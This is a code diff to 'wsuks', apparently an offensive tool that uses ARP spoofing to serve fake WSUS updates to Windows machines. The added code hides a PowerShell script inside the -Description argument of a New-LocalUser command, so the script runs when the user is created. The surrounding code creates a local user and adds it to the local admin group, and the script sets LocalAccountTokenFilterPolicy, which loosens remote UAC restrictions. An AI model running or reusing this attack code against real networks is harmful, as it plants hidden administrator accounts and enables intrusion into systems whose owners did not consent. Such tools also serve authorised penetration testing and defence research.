@@ -6,6 +6,7 @@ from pprint import pformat
 import random
 from string import digits, ascii_letters
 from scapy.all import get_if_addr
+import wsuks
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
@@ -35,12 +36,21 @@ class Wsuks:
         if "CREATE_USER_COMMAND" not in args.command:
             self.command = args.command
         else:
+            # Case we add the domain user to the local admin group
             if args.username and args.domain:
                 self.logger.success(f"Using domain user for the WSUS attack: User={highlight(args.username, 'green')} Password={highlight(args.password, 'green')} Domain={highlight(args.domain, 'green')}")
                 self.command = str(args.command).format(CREATE_USER_COMMAND="", WSUKS_USER=args.domain + "\\" + args.username)
+            # Case we generate a local user, add him to the local admin group and make sure LocalAccountTokenFilterPolicy is set to 1
             else:
+                with open(os.path.join(os.path.dirname(wsuks.__file__), "executables/Enable-LocalAccountTokenFilterPolicy.ps1")) as file:
+                    ps_script = ""
+                    for line in file:
+                        if line.startswith("#"):
+                            continue
+                        else:
+                            ps_script += line
                 self.logger.success(f"Generated local user for the WSUS attack: Username={highlight(self.local_username, 'green')} Password={highlight(self.local_password, 'green')}")
-                create_user = f"New-LocalUser -Name {self.local_username} -Password $(ConvertTo-SecureString {self.local_password} -AsPlainText -Force) -Description This_user_was_generated_by_the_wsuks_Tool;\n"
+                create_user = f"New-LocalUser -Name {self.local_username} -Password $(ConvertTo-SecureString {self.local_password} -AsPlainText -Force) -Description $({ps_script});\n"
                 self.command = str(args.command).format(CREATE_USER_COMMAND=create_user, WSUKS_USER=self.local_username)
         self.logger.success(f"Command to execute: {self.command}")
 
